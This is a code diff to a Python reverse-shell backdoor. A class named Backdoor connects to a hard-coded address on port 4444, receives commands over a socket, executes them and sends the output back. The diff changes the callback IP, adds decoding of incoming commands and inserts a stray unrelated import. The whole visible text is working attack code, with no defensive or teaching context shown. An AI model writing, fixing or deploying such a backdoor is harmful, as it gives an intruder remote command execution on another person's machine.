@@ -3,6 +3,7 @@
 from sqlite3 import connect
 import subprocess
 import socket
+from unittest import result
 
 class Backdoor:
     def __init__(self,ip,port):
@@ -15,10 +16,10 @@ class Backdoor:
     def run(self):
         while True:
             command = self.connection.recv(1024)
-            result = self.exe_remort_command(command)
+            result = self.exe_remort_command(command.decode())
             self.connection.send(result)
-        self.connection.close()
-ip = "192.168.10.8"
+        
+ip = "192.168.10.10"
 port = 4444
 
 backdoor = Backdoor(ip,port)
